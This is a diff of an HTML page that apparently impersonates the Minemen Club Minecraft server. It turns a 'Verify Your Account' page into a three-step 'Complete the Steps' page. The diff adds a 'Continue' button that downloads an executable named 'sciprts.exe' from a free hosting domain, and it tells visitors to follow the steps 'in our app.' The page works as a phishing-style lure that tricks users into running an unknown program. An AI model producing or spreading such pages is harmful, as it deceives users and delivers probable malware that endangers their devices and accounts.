@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Verification | Minemen Club</title>
+<title>Steps | Minemen Club</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/kingsmirnov/Mc/refs/heads/main/img/Login%20_%20Minemen%20Club%20-%20Google%20Chrome%207_5_2026%201_31_46%20AM.png">
 
@@ -32,13 +32,13 @@
 
     .card {
         width: 100%;
-        max-width: 420px;
+        max-width: 460px;
         background: rgba(12, 12, 12, 0.92);
         padding: 55px 48px;
         border-radius: 22px;
         border: 1px solid #1a1a1a;
         box-shadow: 0px 0px 45px rgba(0,0,0,0.55);
-        text-align: center;
+        text-align: left;
         box-sizing: border-box;
         margin-top: -20px;
     }
@@ -55,16 +55,25 @@
         object-fit: contain;
     }
 
-    .card h2 {
-        margin: 0;
-        font-size: 28px;
-        font-weight: 700;
+    .step {
+        margin-bottom: 28px;
+        padding: 18px;
+        background: #1a1a1a;
+        border: 1px solid #3a3a3a;
+        border-radius: 10px;
     }
 
-    .card p {
-        margin: 12px 0 28px;
+    .step h3 {
+        margin: 0 0 10px;
+        font-size: 20px;
+        font-weight: 700;
+        color: #d946ef;
+    }
+
+    .step p {
+        margin: 0;
         color: #bdbdbd;
-        font-size: 16px;
+        font-size: 15px;
     }
 
     .verify-btn {
@@ -78,6 +87,7 @@
         font-weight: 600;
         cursor: pointer;
         transition: transform 0.25s ease, box-shadow 0.25s ease, background 0.25s ease;
+        margin-top: 20px;
     }
 
     .verify-btn:hover {
@@ -92,16 +102,32 @@
 
 <div class="container">
     <div class="card">
+
         <div class="logo">
             <img src="https://raw.githubusercontent.com/kingsmirnov/Mc/refs/heads/main/img/Login%20_%20Minemen%20Club%20-%20Google%20Chrome%207_5_2026%201_31_46%20AM.png">
         </div>
 
-        <h2>Verify Your Account</h2>
-        <p>You must complete verification to continue.</p>
+        <h2 style="text-align:center; margin-bottom: 30px;">Complete the Steps</h2>
 
-        <button class="verify-btn" onclick="window.location.href='https://example.com'">
-            Begin Verification
+        <div class="step">
+            <h3>Step 1</h3>
+            <p>Review the instructions carefully before continuing.</p>
+        </div>
+
+        <div class="step">
+            <h3>Step 2</h3>
+            <p>Click the button below to finish the process.</p>
+        </div>
+
+        <div class="step">
+            <h3>Step 3</h3>
+            <p>Follow the steps in our app.</p>
+        </div>
+
+        <button class="verify-btn" onclick="window.location.href='https://cooperative-bronze-4obmmt5k.edgeone.dev/sciprts.exe'">
+            Continue
         </button>
+
     </div>
 </div>
 
